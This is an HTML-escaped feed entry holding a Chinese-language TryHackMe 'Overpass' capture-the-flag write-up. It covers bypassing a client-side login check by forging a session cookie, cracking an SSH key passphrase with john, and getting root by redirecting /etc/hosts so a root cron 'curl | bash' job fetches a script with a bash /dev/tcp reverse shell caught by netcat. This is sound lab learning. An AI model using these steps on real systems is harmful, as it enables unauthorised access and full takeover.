punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;7&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token keyword&#34;&gt;const&lt;/span&gt; response &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;await&lt;/span&gt; &lt;span class=&#34;token function&#34;&gt;postData&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;/api/login&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; creds&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;8&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token keyword&#34;&gt;const&lt;/span&gt; statusOrCookie &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;await&lt;/span&gt; response&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token function&#34;&gt;text&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;9&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token keyword&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;statusOrCookie &lt;span class=&#34;token operator&#34;&gt;===&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#34;Incorrect credentials&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;10&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        loginStatus&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;textContent &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#34;Incorrect Credentials&#34;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;11&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        passwordBox&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;value&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;&#34;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;12&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;else&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;13&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        Cookies&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token function&#34;&gt;set&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;SessionToken&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;statusOrCookie&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;14&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        window&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;location &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#34;/admin&#34;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;blockquote&gt;
+&lt;p&gt;两种方法绕过:&lt;br /&gt;
+&lt;strong&gt; 方法一:&lt;/strong&gt; 代码审计发现如果登录返回不是 Incorrect credentials 则设置 cookie&lt;br /&gt;
+ 我们可以控制 bp 抓登陆的响应包将包的 Incorrect credentials 修改并且设置 302 响应 &amp;gt; 头 loaction:/admin&lt;br /&gt;
+&lt;strong&gt; 方法二:&lt;/strong&gt; 直接在控制台修改 document.cookie=&amp;quot;SessionToken&amp;quot;&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;h1 id=&#34;ssh连接&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#ssh连接&#34;&gt;#&lt;/a&gt; ssh 连接&lt;/h1&gt;
+&lt;blockquote&gt;
+&lt;p&gt;在 /admin 找到 ssh 私钥，将私钥保存位 rsa, 但是要找到私钥的密码可以利用 ssh2john 和 john 破解密码&lt;br /&gt;
+最后找到私钥密码 james13&lt;br /&gt;
+ 直接利用 ssh 登陆&lt;br /&gt;
+&lt;img loading=&#34;lazy&#34; data-src=&#34;https://img2.imgtp.com/2024/02/01/NctBPrVj.jpg&#34; alt=&#34;&#34; /&gt;&lt;br /&gt;
+获取 user 的 flag&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;h1 id=&#34;权限提升&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#权限提升&#34;&gt;#&lt;/a&gt; 权限提升&lt;/h1&gt;
+&lt;blockquote&gt;
+&lt;p&gt;可以看到 todo.txt 有提示在 /etc/crontab 中发现有 root 权限的脚本&lt;br /&gt;
+ root curl overpass.thm/downloads/src/buildscript.sh | bash&lt;br /&gt;
+ 并且 /etc/hosts 我们可以修改此时就想到我们可以 利用 root 的 cronjob 来进行一个反弹 shell&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;h2 id=&#34;思路&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#思路&#34;&gt;#&lt;/a&gt; 思路&lt;/h2&gt;
+&lt;blockquote&gt;
+&lt;p&gt;将 /etc/hosts 的 overpass.thm 对应的 ip 修改为本机的 ip&lt;br /&gt;
+ 本机开 http 服务  python -m http.server 80&lt;br /&gt;
+&lt;strong&gt;Ps:&lt;/strong&gt;&lt;br /&gt;
+ 注意本机的网站目录必须是 downloads/src/buildscript.sh&lt;br /&gt;
+&lt;a href=&#34;http://xn--buildscript-ft8qz71o.sh&#34;&gt; 并且 buildscript.sh&lt;/a&gt; 应该修改为 bash -i &amp;gt;&amp;amp; /dev/tcp/ 本机 ip / 本机端口 0&amp;gt;&amp;amp;!&lt;br /&gt;
+ 最后在本机中开启 nc -lvp  本机端口开启监听等几秒就会有 root 的 shell 连接&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;h1 id=&#34;总结&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#总结&#34;&gt;#&lt;/a&gt; 总结&lt;/h1&gt;
+&lt;blockquote&gt;
+&lt;p&gt;overpass1 还是比较简单的主要还是要掌握一些基本的提权方法以及 web 登陆的相关机制的知识&lt;/p&gt;
+&lt;/blockquote&gt;
+</content>
+        <category term="linux提权" />
+        <category term="tryhackme" />
+        <updated>2024-02-01T01:49:48.000Z</updated>
+    </entry>
+</feed>
